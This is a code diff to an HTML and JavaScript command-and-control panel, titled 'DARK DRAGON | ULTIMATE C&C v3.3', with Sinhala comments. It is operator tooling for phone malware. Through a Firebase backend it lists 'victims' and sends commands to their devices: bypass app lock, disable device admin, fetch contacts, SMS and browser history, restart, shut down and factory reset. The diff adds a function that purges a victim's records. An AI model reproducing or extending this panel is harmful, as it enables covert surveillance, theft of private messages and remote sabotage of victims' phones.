@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE C&C v3.2</title>
+    <title>DARK DRAGON | ULTIMATE C&C v3.3</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -25,8 +25,9 @@
         .data-card { border: 1px solid var(--dark-red); background: #000; padding: 15px; margin-bottom: 15px; position: relative; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; }
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
-        .live-window { width: 100%; height: 250px; background: #000; border: 1px solid var(--neon-red); display: flex; align-items: center; justify-content: center; color: var(--neon-red); overflow: hidden; }
-        .unlock-btn { background: var(--green) !important; color: black !important; }
+        .btn-select { background: var(--green); color: black; }
+        .btn-remove { background: #550000; color: white; border: 1px solid red; }
+        .btn-remove:hover { background: red; }
     </style>
 </head>
 <body>
@@ -69,7 +70,15 @@
         <div id="victims" class="panel">
             <h2>LIVE VICTIM LOGS</h2>
             <table>
-                <thead><tr><th>Name</th><th>Device</th><th>Time</th><th>Action</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Name</th>
+                        <th>Device</th>
+                        <th>Time</th>
+                        <th>Status</th>
+                        <th>Purge</th>
+                    </tr>
+                </thead>
                 <tbody id="victim-list"></tbody>
             </table>
         </div>
@@ -103,15 +112,14 @@
             <h2>🔓 UNLOCKED SYSTEM PROTOCOLS</h2>
             <div class="data-card">
                 <h3>SECURITY BYPASS</h3>
-                <button class="unlock-btn" onclick="sendCommand('bypass_lock')">BYPASS APP LOCK</button>
-                <button class="unlock-btn" onclick="sendCommand('disable_admin')">DISABLE DEVICE ADMIN</button>
-                <button class="unlock-btn" onclick="sendCommand('clear_keys')">WIPE PIN/PATTERN</button>
+                <button style="background:var(--green); color:black;" onclick="sendCommand('bypass_lock')">BYPASS APP LOCK</button>
+                <button style="background:var(--green); color:black;" onclick="sendCommand('disable_admin')">DISABLE ADMIN</button>
             </div>
             <div class="data-card">
                 <h3>SYSTEM ACCESS</h3>
-                <button onclick="sendCommand('get_contacts')">FETCH CONTACTS</button>
-                <button onclick="sendCommand('get_messages')">FETCH SMS</button>
-                <button onclick="sendCommand('get_history')">BROWSER HISTORY</button>
+                <button onclick="sendCommand('get_contacts')">CONTACTS</button>
+                <button onclick="sendCommand('get_messages')">SMS</button>
+                <button onclick="sendCommand('get_history')">HISTORY</button>
             </div>
         </div>
 
@@ -120,7 +128,6 @@
             <button onclick="sendCommand('restart')" style="background:orange">RESTART</button>
             <button onclick="sendCommand('shutdown')" style="background:red; color:white">OFF</button>
             <button onclick="sendCommand('reset')" style="background:yellow">FACTORY RESET</button>
-            <button onclick="sendCommand('alert_msg')">SEND POP-UP ALERT</button>
         </div>
     </div>
 </div>
@@ -153,8 +160,13 @@
             list.innerHTML = "";
             snap.forEach((child) => {
                 const val = child.val();
-                list.innerHTML += `<tr><td>${val.target}</td><td>${val.device}</td><td>${val.time}</td>
-                <td><button onclick="selectTarget('${child.key}', '${val.target}')">SELECT</button></td></tr>`;
+                list.innerHTML += `<tr>
+                    <td>${val.target}</td>
+                    <td>${val.device}</td>
+                    <td>${val.time}</td>
+                    <td><button class="btn-select" onclick="selectTarget('${child.key}', '${val.target}')">SELECT</button></td>
+                    <td><button class="btn-remove" onclick="removeVictim('${child.key}')">REMOVE</button></td>
+                </tr>`;
             });
         });
     }
@@ -163,7 +175,23 @@
     function selectTarget(key, name) {
         window.activeTarget = key;
         document.getElementById('active-target-display').innerText = name;
-        alert("Target [" + name + "] Selected! All protocols ready.");
+        alert("Target [" + name + "] Locked!");
+    }
+
+    // --- පිරිසිදු කිරීමේ Function එක ---
+    function removeVictim(key) {
+        if(confirm("මෙම Victim ව සම්පූර්ණයෙන්ම අයින් කරන්නද?")) {
+            // Database එකෙන් අයින් කරනවා
+            db.ref('victims/' + key).remove();
+            db.ref('commands/' + key).remove();
+            
+            // දැනට Select වෙලා හිටපු කෙනාම නම් අයින් කරන්නේ, Locked Display එක Reset කරනවා
+            if(window.activeTarget === key) {
+                window.activeTarget = null;
+                document.getElementById('active-target-display').innerText = "NONE";
+            }
+            alert("Victim Purged!");
+        }
     }
 
     function sendCommand(cmd) {
